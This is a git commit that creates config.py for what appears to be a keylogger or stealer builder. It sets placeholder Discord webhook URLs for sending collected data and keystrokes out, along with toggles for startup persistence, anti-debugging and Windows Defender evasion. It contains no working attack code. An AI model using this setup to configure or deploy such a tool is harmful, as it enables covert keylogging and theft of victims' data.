c37f730550a400746204eb28f07129536703e89c
Josakko <112590914+Josakko@users.noreply.github.com>
2023-05-02 23:33:36 +0200

    Create config.py

---
+++ config.py
@@ -0,0 +1,9 @@
+#this file is automatically edited by builder script
+WEBHOOK = 'https://discord.com/api/webhooks/ID/TOKEN'
+WEBHOOK_KEYLOGGER = 'https://discord.com/api/webhooks/ID/TOKEN'
+INTERVAL = 10
+STARTUP = False
+KEYLOGGER = True
+ERROR = True
+ANTIDEBUG = False
+DEFENDER = False
